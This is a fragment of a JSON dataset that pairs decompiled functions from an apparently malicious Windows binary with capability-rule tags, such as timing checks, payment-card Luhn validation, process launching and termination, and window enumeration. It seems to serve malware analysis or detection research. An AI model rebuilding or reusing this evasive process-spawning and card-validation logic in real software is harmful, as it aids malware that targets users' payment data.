        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403bd3) overlaps instruction at (ram,0x00403bd0)\n// \n\nuint fcn.004039a0(void)\n\n{\n    uint32_t uVar1;\n    uint16_t extraout_CX;\n    int32_t *piVar2;\n    uint unaff_EBX;\n    uint *puVar3;\n    uint *unaff_EBP;\n    int16_t unaff_SI;\n    bool bVar4;\n    char cVar5;\n    char cVar6;\n    unkbyte10 extraout_ST0;\n    ulong uVar7;\n    uint uVar8;\n    \n    fcn.00402b40(0x407010, 0x15, 0x4114a8, 0x20);\n    fcn.00402b40(0x407010, 0x15, 0x4114c8, 0x26);\n    fcn.00402b40(0x407010, 0x15, 0x4114f0, 8);\n    uVar1 = fcn.00402b40(0x407010, 0x15, 0x4114f8, 0x19);\n    cVar6 = '\\0';\n    cVar5 = '\\0';\n    bVar4 = ((uVar1 ^ 0x687c) & 0x3000) == 0;\n    uVar8 = 0x403a8b;\n    fcn.00402b40(0x407010, 0x15, 0x411514, 0xb);\n    if ((bVar4 || cVar6 != cVar5) || (!bVar4 && cVar6 == cVar5)) {\n        uVar8 = 0x12;\n    }\n    fcn.00402b40(0x407010, 0x15, 0x411520, uVar8);\n    fcn.00402b40(0x407010, 0x15, 0x411534, 0x12);\n    fcn.00402b40(0x407010, 0x15, 0x411548, 2);\n    bVar4 = false;\n    uVar8 = fcn.00402b40(0x407010, 0x15, 0x41154c, 8);\n    if ((!bVar4) && (bVar4)) {\n        out(0xbd, uVar8);\n        return uVar8;\n    }\n    uVar7 = fcn.00402b40(0x407010, 0x15, 0x411554, 8);\n    piVar2 = uVar7 >> 0x20;\n    *(uVar7 + -0x7ce92414) = extraout_ST0;\n    *piVar2 = *piVar2 + 0x66adf84;\n    fcn.00402b40(0x407010, 0x15, 0x41155c, unaff_EBX);\n    fcn.00402b40(0x407010, 0x15, 0x411564, 7);\n    bVar4 = SBORROW2(unaff_SI + 1, unaff_SI + 1);\n    uVar8 = 0x403bbc;\n    fcn.00402b40(0x407010, 0x15, 0x41156c, 7);\n    if ((bVar4) || (!bVar4)) {\n        uVar8 = 6;\n    }\n    puVar3 = &stack0xffffffdc;\n    fcn.00402b40(0x407010, 0x15, 0x411574, uVar8);\n    bVar4 = (POPCOUNT((unaff_EBX ^ extraout_CX) & 0xff) & 1U) == 0;\n    fcn.00402b40(0x407010, 0x15, 0x41157c, 0x25);\n    if ((!bVar4) && (bVar4)) {\n        cVar5 = '\\x1e';\n        do {\n            unaff_EBP = unaff_EBP + -1;\n            puVar3 = puVar3 + -1;\n            *puVar3 = *unaff_EBP;\n            cVar5 = cVar5 + -1;\n        } while ('\\0' < cVar5);\n        uVar8 = in(0x78);\n        return uVar8;\n    }\n    uVar8 = fcn.00402b40(0x407010, 0x15, 0x4115a4, 8);\n    return uVar8;\n}\n",
        "token_count": 1037
    },
    "00403fb0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __cdecl fcn.00403fb0(int32_t *hWnd)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint *in_FS_OFFSET;\n    uint var_24ch;\n    uchar var_148h;\n    uint var_147h;\n    int32_t hLibModule;\n    int32_t var_40h;\n    int32_t pbstr;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    int32_t *var_28h;\n    int32_t Msg;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x405080;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    (*_sym.imp.ole32.dll_CoInitialize)();\n    hLibModule = (*_sym.imp.KERNEL32.dll_LoadLibraryA)();\n    if (hLibModule == 0) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    Msg = (*_sym.imp.USER32.dll_RegisterWindowMessageA)();\n    (*_sym.imp.USER32.dll_SendMessageTimeoutA)(hWnd, Msg, 0, 0, 2, 1000, &var_18h);\n    pcVar1 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(hLibModule, 0x411534);\n    if (pcVar1 == NULL) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_20h = NULL;\n    var_4h = 0;\n    iVar2 = (*pcVar1)(var_18h, str._D_3, 0, &var_20h);\n    if ((iVar2 < 0) || (var_20h == NULL)) {\n        var_4h = 0xffffffff;\n        if (var_20h != NULL) {\n            (**(*var_20h + 8))(var_20h);\n        }\n    }\n    else {\n        var_28h = NULL;\n    // WARNING: Ignoring partial resolution of indirect\n        var_4h._0_1_ = 1;\n        iVar2 = (**(*var_20h + 0x20))(var_20h, &var_28h);\n        if ((iVar2 < 0) || (var_28h == NULL)) {\n    // WARNING: Ignoring partial resolution of indirect\n            var_4h._0_1_ = 0;\n        }\n        else {\n            var_1ch = 0;\n            (**(*var_28h + 0x24))(var_28h, &var_1ch);\n            Msg = 0;\n            if (0 < var_1ch) {\n                do {\n                    var_30h = (*_sym.imp.MSVCRT.dll_rand)();\n                    var_30h = var_30h % var_1ch;\n                    var_38h = CONCAT22(var_38h._2_2_, 3);\n                    hWnd = NULL;\n                    var_10h = NULL;\n    // WARNING: Ignoring partial resolution of indirect\n                    var_4h._0_1_ = 4;\n                    iVar2 = (**(*var_28h + 0x2c))\n                                      (var_28h, var_38h, var_34h, var_30h, var_2ch, var_38h, var_34h, var_30h, var_2ch, \n                                       &hWnd);\n                    if ((iVar2 < 0) || (hWnd == NULL)) {\n    // WARNING: Ignoring partial resolution of indirect\n                        var_4h._0_1_ = 3;\n                        if (var_10h != NULL) {\n                            (**(*var_10h + 8))(var_10h);\n                        }\n    // WARNING: Ignoring partial resolution of indirect\n                        var_4h._0_1_ = 2;\njoined_r0x004043e2:\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\ncode_r0x004043ee:\n                        (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_38h);\n                        break;\n                    }\n                    iVar2 = (***hWnd)(hWnd, 0x4061b0, &var_10h);\n                    if ((iVar2 < 0) || (var_10h == NULL)) {\n    // WARNING: Ignoring partial resolution of indirect\n                        var_4h._0_1_ = 3;\njoined_r0x004043a9:\n                        if (var_10h != NULL) {\n                            (**(*var_10h + 8))(var_10h);\n                        }\n    // WARNING: Ignoring partial resolution of indirect\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                        goto code_r0x004043ee;\n                    }\n                    iVar2 = (**(*var_10h + 0x38))(var_10h, &pbstr);\n                    if (iVar2 < 0) {\ncode_r0x0040436a:\n    // WARNING: Ignoring partial resolution of indirect\n                        var_4h._0_1_ = 3;\n                        goto joined_r0x004043a9;\n                    }\n                    if (pbstr == 0) {\n    // WARNING: Ignoring partial resolution of indirect\n                        var_4h._0_1_ = 3;\njoined_r0x004041e5:\n                        if (var_10h != NULL) {\n                            (**(*var_10h + 8))(var_10h);\n                        }\n    // WARNING: Ignoring partial resolution of indirect\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                    }\n                    else {\n                        fcn.00403dd0(pbstr, &var_24ch, 0x104);\n                        (*_sym.imp.OLEAUT32.dll_SysStringLen)(pbstr);\n                        iVar3 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_24ch, 0x411548);\n                        if (iVar3 != 0) {\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 3;\n                            goto joined_r0x004041e5;\n                        }\n                        var_14h = NULL;\n    // WARNING: Ignoring partial resolution of indirect\n                        var_4h._0_1_ = 5;\n                        iVar2 = (***hWnd)(hWnd, 0x4061a0, &var_14h);\n                        if ((iVar2 < 0) || (var_14h == NULL)) {\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 3;\njoined_r0x0040438e:\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 2;\n                            goto joined_r0x004043e2;\n                        }\n                        iVar2 = (**(*var_14h + 0x20))(var_14h, &var_40h);\n                        iVar3 = var_40h;\n                        if (iVar2 < 0) {\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 3;\n                            goto joined_r0x0040438e;\n                        }\n                        if (var_40h == 0) {\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 2;\n                        }\n                        else {\n                            var_148h = 0;\n                            puVar5 = &var_147h;\n                            for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n                                *puVar5 = 0;\n                                puVar5 = puVar5 + 1;\n                            }\n                            *puVar5 = 0;\n                            *(puVar5 + 2) = 0;\n                            fcn.00403dd0(iVar3, &var_148h, 0x104);\n                            (*_sym.imp.OLEAUT32.dll_SysStringLen)(var_40h);\n                            iVar3 = fcn.00403ee0(&var_148h);\n                            if (iVar3 == 0) {\n                                (*_sym.imp.KERNEL32.dll_Sleep)(10);\n                                (**(*var_10h + 0x114))(var_10h);\n    // WARNING: Ignoring partial resolution of indirect\n                                var_4h._0_1_ = 4;\n                                if (var_14h != NULL) {\n                                    (**(*var_14h + 8))(var_14h);\n                                }\n                                goto code_r0x0040436a;\n                            }\n                            (*_sym.imp.KERNEL32.dll_Sleep)(0);\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 2;\n                        }\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                    }\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_38h);\n                    Msg = Msg + 1;\n                } while (Msg < var_1ch);\n            }\n    // WARNING: Ignoring partial resolution of indirect\n            var_4h._0_1_ = 0;\n        }\n        if (var_28h != NULL) {\n            (**(*var_28h + 8))(var_28h);\n        }\n        var_4h = 0xffffffff;\n        if (var_20h != NULL) {\n            (**(*var_20h + 8))(var_20h);\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_FreeLibrary)(hLibModule);\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    *in_FS_OFFSET = var_ch;\n    return iVar2;\n}\n",
        "token_count": 2670
    },
    "004044f0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0040456d) overlaps instruction at (ram,0x0040456b)\n// \n// WARNING: Removing unreachable block (ram,0x0040475d)\n// WARNING: Removing unreachable block (ram,0x00404769)\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __cdecl fcn.004044f0(code *arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    uchar uVar4;\n    uint16_t uVar5;\n    int32_t iVar6;\n    uint32_t in_EAX;\n    uint8_t extraout_CH;\n    int32_t in_ECX;\n    uint8_t *puVar7;\n    uint32_t *unaff_EDI;\n    uint *puVar8;\n    bool bVar9;\n    uint8_t in_AF;\n    bool bVar10;\n    ulong uVar11;\n    uint unaff_retaddr;\n    uchar uStackY612;\n    uint uStackY611;\n    uint *puStackY389;\n    code *pcStackY385;\n    uchar auStackY381 [4];\n    uchar *puStackY377;\n    uint uStackY373;\n    uint uStackY369;\n    uint uStackY365;\n    uint uStackY361;\n    code *pcStackY357;\n    uchar auStackY353 [2];\n    uchar auStackY351 [6];\n    uchar *puStackY345;\n    uint uStackY341;\n    uint uStackY337;\n    uint uStackY333;\n    uchar uStackY329;\n    uchar uStackY328;\n    ushort uStackY327;\n    int32_t iStackY325;\n    uchar *puStackY321;\n    uchar *puStackY317;\n    uchar uStackY313;\n    uchar uStackY312;\n    ushort uStackY311;\n    uchar uStackY309;\n    uchar uStackY308;\n    ushort uStackY307;\n    uint uStackY305;\n    uchar uStackY301;\n    uchar uStackY300;\n    ushort uStackY299;\n    uchar uStackY297;\n    uchar uStackY296;\n    ushort uStackY295;\n    uchar uStackY293;\n    uchar *puStackY292;\n    uint *puStack276;\n    uchar var_108h;\n    uint var_107h;\n    uint auStack92 [11];\n    uint uStack48;\n    ushort uStack44;\n    int32_t iStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    int32_t var_4h;\n    \n    if ((*0x10 != 0x10c && 0x107 < &stack0xfffffffc) &&\n       (*0x10 == 0x10c || SBORROW4(&stack0xfffffffc, 0x108) != &stack0xfffffef4 < 0)) {\n        uVar2 = 9 < (in_EAX & 0xf) | in_AF;\n        uVar3 = in_EAX + uVar2 * '\\x06';\n        uVar5 = CONCAT11((in_EAX >> 8) + uVar2, uVar3) & 0xff0f;\n        if (in_ECX != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        for (; in_ECX != 0; in_ECX = in_ECX + -1) {\n            *unaff_EDI = in_EAX & 0xffff0000 | uVar5;\n            unaff_EDI = unaff_EDI + 1;\n        }\n        puStack276 = 0x104;\n        *unaff_EDI = uVar5;\n        *(unaff_EDI + 2) = uVar3 & 0xf;\n        (*_sym.imp.USER32.dll_GetClassNameA)();\n        puStackY292 = &stack0xfffffeec;\n        uStackY296 = 0xb5;\n        uStackY295 = 0x4044;\n        uStackY293 = 0;\n        iVar6 = (*_sym.imp.MSVCRT.dll__stricmp)();\n        if (iVar6 != 0) {\n            return 1;\n        }\n        puStackY292 = 0x4044c2;\n        fcn.00403fb0(unaff_retaddr);\n        return 0;\n    }\n    puStack276 = &fcn.004044f0::var_4h;\n    (*_sym.imp.USER32.dll_GetWindowThreadProcessId)();\n    if (arg_ch != var_4h) {\n        return 1;\n    }\n    bVar9 = false;\n    bVar10 = true;\n    var_108h = 0;\n    puStackY292 = &stack0xfffffef4;\n    puVar8 = &fcn.004044f0::var_107h;\n    for (iVar6 = 0x40; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = 0;\n    uStackY296 = SUB41(arg_8h, 0);\n    uStackY295 = arg_8h >> 8;\n    uStackY293 = arg_8h >> 0x18;\n    uVar4 = uStackY293;\n    *(puVar8 + 2) = 0;\n    uStackY300 = 0x5d;\n    uStackY299 = 0x4045;\n    uStackY297 = 0;\n    (*_sym.imp.USER32.dll_GetClassNameA)();\n    if ((!bVar9 && !bVar10) && (bVar9 || bVar10)) {\n        puVar8[-0x1c] = puVar8[-0x1c] - &stack0xfffffed8;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    uStackY300 = 0xf0;\n    uStackY299 = 0x4114;\n    uStackY297 = 0;\n    uStackY301 = &stack0xfffffef4 >> 0x18;\n    uStackY308 = 0x7f;\n    uStackY307 = 0x4045;\n    uStackY305 = &stack0xfffffef4 * 0x100;\n    uVar11 = (*_sym.imp.MSVCRT.dll__stricmp)();\n    puVar7 = uVar11 >> 0x20;\n    bVar9 = uVar11 != 0;\n    if (bVar9) {\n        return 1;\n    }\n    if ((!bVar9) || (bVar9)) {\n        uStackY296 = 0;\n        uStackY295 = 0;\n        uStackY293 = 0;\n    }\n    else {\n        uVar1 = in(uVar11 >> 0x20);\n        *CONCAT13(uStackY293, CONCAT21(uStackY295, uStackY296)) = uVar1;\n        if (&stack0xfffffedc < 1) {\n            uStackY297 = 0x2c;\n            uStackY296 = 0x46;\n            uStackY295 = 0x40;\n            uStackY299 = fcn.004039a0();\n            uStackY297 = 0x46;\n            uStackY296 = 0x46;\n            uStackY295 = 0x40;\n            iStack24 = fcn.00403e00();\n            if (iStack24 != 0) {\n                uStackY612 = 0;\n                uStackY297 = 0;\n                uStackY296 = 0;\n                uStackY295 = 0;\n                puVar8 = &stack0xfffffd9d;\n                for (iVar6 = 0x40; iVar6 != 0; iVar6 = iVar6 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n                *puVar8 = 0;\n                *(puVar8 + 2) = 0;\n                uStackY305 = &stack0xfffffd9c;\n                uStackY301 = 0x26;\n                uStackY300 = 0;\n                uStackY299 = 0;\n                uStackY309 = 0;\n                uStackY308 = 0;\n                uStackY307 = 0;\n                uStackY313 = 0x9b;\n                uStackY312 = 0x46;\n                uStackY311 = 0x40;\n                uVar11 = (*_sym.imp.SHELL32.dll_SHGetSpecialFolderPathA)();\n                puStackY321 = uVar11 >> 0x20;\n                iStack24 = uVar11;\n                if (iStack24 != 0) {\n                    uStackY313 = 0xd1;\n                    uStackY312 = 0x46;\n                    uStackY311 = 0x40;\n                    fcn.00404d40();\n                    _auStackY353 = _auStackY353 & 0xffff00ff;\n                    puVar8 = &stack0xfffffea1;\n                    for (iVar6 = 0x40; iVar6 != 0; iVar6 = iVar6 + -1) {\n                        *puVar8 = 0;\n                        puVar8 = puVar8 + 1;\n                    }\n                    *puVar8 = 0;\n                    *(puVar8 + 2) = 0;\n                    uStackY313 = 3;\n                    uStackY312 = 0;\n                    uStackY311 = 0;\n                    puStackY321 = &stack0xfffffd9c;\n                    puStackY317 = 0x4114a8;\n                    iStackY325 = 0x4114c8;\n                    uStackY329 = SUB41(&stack0xfffffea0, 0);\n                    uStackY328 = &stack0xfffffea0 >> 8;\n                    uStackY327 = &stack0xfffffea0 >> 0x10;\n                    uStackY333 = 0x404723;\n                    (*_sym.imp.MSVCRT.dll_sprintf)();\n                    iStack24 = 0;\n                    do {\n                        puVar8 = &stack0xffffffa4;\n                        for (iVar6 = 0x11; iVar6 != 0; iVar6 = iVar6 + -1) {\n                            *puVar8 = 0;\n                            puVar8 = puVar8 + 1;\n                        }\n                        uStack20 = 0;\n                        auStack92[0] = 0x44;\n                        uStack16 = 0;\n                        uStack48 = 1;\n                        uStack12 = 0;\n                        uStack44 = 0;\n                        puStackY317 = &stack0xffffffa4;\n                        uStackY313 = SUB41(&stack0xffffffec, 0);\n                        uStackY312 = &stack0xffffffec >> 8;\n                        uStackY311 = &stack0xffffffec >> 0x10;\n                        puStackY321 = NULL;\n                        iStackY325 = 0;\n                        uStackY329 = 0;\n                        uStackY328 = 0;\n                        uStackY327 = 0;\n                        uStackY333 = 0;\n                        uStackY337 = 0;\n                        puStackY345 = &stack0xfffffea0;\n                        uStackY341 = 0;\n                        auStackY351._2_4_ = 0;\n                        _auStackY353 = 0x40478b;\n                        iVar6 = (*_sym.imp.KERNEL32.dll_CreateProcessA)();\n                        bVar9 = iVar6 == 0;\n                        if (bVar9) {\n                            return 0;\n                        }\n                        if ((bVar9) || (!bVar9)) {\n                            _auStackY353 = 3000;\n                            pcStackY357 = 0x4047ae;\n                            (*_sym.imp.KERNEL32.dll_Sleep)();\n                        }\n                        else {\n                            puVar8[0x1a] = puVar8[0x1a] - &stack0xfffffea3;\n                        }\n                        _auStackY353 = uStack12;\n                        pcStackY357 = fcn.004044f0;\n                        uStackY361 = 0x4047bd;\n                        (*_sym.imp.USER32.dll_EnumWindows)();\n                        uStackY373 = 0;\n                        uStackY365 = uStack20;\n                        uStackY361 = 1000;\n                        uStackY369 = 0x4047da;\n                        puStackY389 = puVar8;\n                        pcStackY385 = arg_8h;\n                        auStackY381 = &stack0xfffffffc;\n                        puStackY377 = &stack0xfffffe9b;\n                        iVar6 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)();\n                        if (iVar6 == 0x102) {\n                            uStackY373 = uStack20;\n                            uStackY369 = 1;\n                            puStackY377 = 0x4047ed;\n                            (*_sym.imp.KERNEL32.dll_TerminateProcess)();\n                        }\n                        arg_8h = _sym.imp.KERNEL32.dll_CloseHandle;\n                        uStackY369 = uStack16;\n                        uStackY373 = 0x40480a;\n                        (*_sym.imp.KERNEL32.dll_CloseHandle)();\n                        uStackY373 = uStack20;\n                        puStackY377 = 0x404810;\n                        (*arg_8h)();\n                        iStack24 = iStack24 + 1;\n                    } while (iStack24 < 3);\n                }\n            }\n            return iStack24;\n        }\n    }\n    *puVar7 = *puVar7 ^ extraout_CH;\n    uStackY300 = 0x70;\n    uStackY299 = 0x4044;\n    uStackY297 = 0;\n    uStackY305._1_3_ = SUB43(arg_8h, 0);\n    uStackY308 = 0xbf;\n    uStackY307 = 0x4045;\n    uStackY305._0_1_ = 0;\n    uStackY301 = uVar4;\n    (*_sym.imp.USER32.dll_EnumChildWindows)();\n    uStackY308 = 0xc5;\n    uStackY307 = 0x4045;\n    uStackY305._0_1_ = 0;\n    iVar6 = (*_sym.imp.MSVCRT.dll_rand)();\n    iVar6 = (iVar6 % 10 + 4) * 1000;\n    uStackY308 = iVar6;\n    uStackY307 = iVar6 >> 8;\n    uStackY305._0_1_ = iVar6 >> 0x18;\n    uStackY312 = 0xe3;\n    uStackY311 = 0x4045;\n    uStackY309 = 0;\n    (*_sym.imp.KERNEL32.dll_Sleep)();\n    uStackY312 = 0;\n    uStackY311 = 0;\n    uStackY309 = 0;\n    uStackY313 = 0;\n    puStackY317 = NULL;\n    puStackY321 = CONCAT31(0x10, uVar4);\n    uStackY328 = 0xf0;\n    uStackY327 = 0x4045;\n    iStackY325 = arg_8h << 8;\n    (*_sym.imp.USER32.dll_PostMessageA)();\n    return 0;\n}\n",
        "token_count": 3433
    },
    "00404600": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get common file path",
            "contain loop",
            "enumerate gui resources",
            "terminate process"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004047a3) overlaps instruction at (ram,0x004047a1)\n// \n// WARNING: Removing unreachable block (ram,0x0040475d)\n// WARNING: Removing unreachable block (ram,0x00404769)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid fcn.00404600(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    bool bVar4;\n    ulong uVar5;\n    uint uStack680;\n    uchar *puStack676;\n    uint uStack672;\n    uint uStack668;\n    uint uStack664;\n    uchar *puStack660;\n    uint uStack656;\n    uchar *puStack652;\n    uint *puStack648;\n    uint *puStack644;\n    uint uStack640;\n    uchar *puStack636;\n    ushort uStack632;\n    ushort uStack630;\n    uchar uStack628;\n    uchar uStack627;\n    ushort uStack626;\n    uchar uStack612;\n    uint uStack611;\n    uchar uStack352;\n    uint uStack351;\n    uint auStack92 [11];\n    uint uStack48;\n    ushort uStack44;\n    int32_t iStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack628 = 0x2c;\n    uStack627 = 0x46;\n    uStack626 = 0x40;\n    uStack630 = fcn.004039a0();\n    uStack628 = 0x46;\n    uStack627 = 0x46;\n    uStack626 = 0x40;\n    iVar2 = fcn.00403e00();\n    if (iVar2 != 0) {\n        uStack612 = 0;\n        uStack628 = 0;\n        uStack627 = 0;\n        uStack626 = 0;\n        puVar3 = &uStack611;\n        for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar3 = 0;\n            puVar3 = puVar3 + 1;\n        }\n        *puVar3 = 0;\n        *(puVar3 + 2) = 0;\n        puStack636 = &uStack612;\n        uStack632 = 0x26;\n        uStack630 = 0;\n        uStack640 = 0;\n        puStack644 = 0x40469b;\n        uVar5 = (*_sym.imp.SHELL32.dll_SHGetSpecialFolderPathA)();\n        puStack652 = uVar5 >> 0x20;\n        if (uVar5 != 0) {\n            puStack644 = 0x4046d1;\n            fcn.00404d40();\n            uStack352 = 0;\n            puVar3 = &uStack351;\n            for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            *puVar3 = 0;\n            *(puVar3 + 2) = 0;\n            puStack644 = 0x3;\n            puStack652 = &uStack612;\n            puStack648 = 0x4114a8;\n            puStack660 = &uStack352;\n            uStack656 = 0x4114c8;\n            uStack664 = 0x404723;\n            (*_sym.imp.MSVCRT.dll_sprintf)();\n            iStack24 = 0;\n            do {\n                puVar3 = auStack92;\n                for (iVar2 = 0x11; iVar2 != 0; iVar2 = iVar2 + -1) {\n                    *puVar3 = 0;\n                    puVar3 = puVar3 + 1;\n                }\n                uStack20 = 0;\n                auStack92[0] = 0x44;\n                uStack16 = 0;\n                uStack48 = 1;\n                uStack12 = 0;\n                uStack44 = 0;\n                uStack8 = 0;\n                puStack644 = &uStack20;\n                puStack648 = auStack92;\n                puStack652 = NULL;\n                uStack656 = 0;\n                puStack660 = NULL;\n                uStack664 = 0;\n                uStack668 = 0;\n                puStack676 = &uStack352;\n                uStack672 = 0;\n                uStack680 = 0;\n                iVar2 = (*_sym.imp.KERNEL32.dll_CreateProcessA)();\n                bVar4 = iVar2 == 0;\n                if (bVar4) {\n                    return;\n                }\n                if ((bVar4) || (!bVar4)) {\n                    (*_sym.imp.KERNEL32.dll_Sleep)();\n                }\n                else {\n                    puVar3[0x1a] = puVar3[0x1a] - &uStack680;\n                }\n                (*_sym.imp.USER32.dll_EnumWindows)();\n                iVar2 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(uStack20, 1000);\n                if (iVar2 == 0x102) {\n                    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uStack20, 1);\n                }\n                pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(uStack16);\n                (*pcVar1)(uStack20);\n                iStack24 = iStack24 + 1;\n            } while (iStack24 < 3);\n        }\n    }\n    return;\n}\n",
        "token_count": 1257
    },
    "00404840": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404886) overlaps instruction at (ram,0x00404885)\n// \n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t int.00404840(void)\n\n{\n    int32_t iVar1;\n    uint8_t *unaff_EBX;\n    uint32_t unaff_ESI;\n    uint *unaff_EDI;\n    uint *puVar2;\n    uint var_80h;\n    uint var_60h;\n    uint var_40h;\n    uchar var_20h;\n    uint var_1fh;\n    \n    iVar1 = fcn.00401d00();\n    if (iVar1 == 0) {\n        return 0;\n    }\n    if ((-1 < iVar1) && (-1 >= iVar1)) {\n        *unaff_EBX = *unaff_EBX & 0xc3;\n        *unaff_EDI = *(iVar1 + -0x1bf31dd6);\n        return unaff_ESI;\n    }\n    fcn.00401830();\n    iVar1 = fcn.004013a0(0x411190);\n    if (iVar1 != -1) {\n        return 0;\n    }\n    fcn.00403600();\n    *0x4225cc = 1;\n    iVar1 = fcn.004017e0();\n    if (iVar1 == 0) {\n        var_20h = 0;\n        var_80h._0_1_ = 0;\n        puVar2 = &var_1fh;\n        for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar2 = 0;\n            puVar2 = puVar2 + 1;\n        }\n        *puVar2 = 0;\n        *(puVar2 + 2) = 0;\n        var_60h._0_1_ = 0;\n        puVar2 = &var_80h + 1;\n        for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar2 = 0;\n            puVar2 = puVar2 + 1;\n        }\n        *puVar2 = 0;\n        *(puVar2 + 2) = 0;\n        var_40h._0_1_ = 0;\n        puVar2 = &var_60h + 1;\n        for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar2 = 0;\n            puVar2 = puVar2 + 1;\n        }\n        *puVar2 = 0;\n        *(puVar2 + 2) = 0;\n        puVar2 = &var_40h + 1;\n        for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar2 = 0;\n            puVar2 = puVar2 + 1;\n        }\n        *puVar2 = 0;\n        *(puVar2 + 2) = 0;\n        iVar1 = fcn.00401030(&var_80h, &var_60h, &var_20h, &var_40h);\n        if (iVar1 == 0) {\n            return 0;\n        }\n        iVar1 = fcn.004018e0(&var_20h);\n        if (iVar1 == 0) {\n            return 0;\n        }\n        iVar1 = fcn.00402300(&var_80h, &var_60h, &var_20h, &var_40h);\n        return iVar1 != 0;\n    }\n    return 0;\n}\n",
        "token_count": 822
    },
    "00401180": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
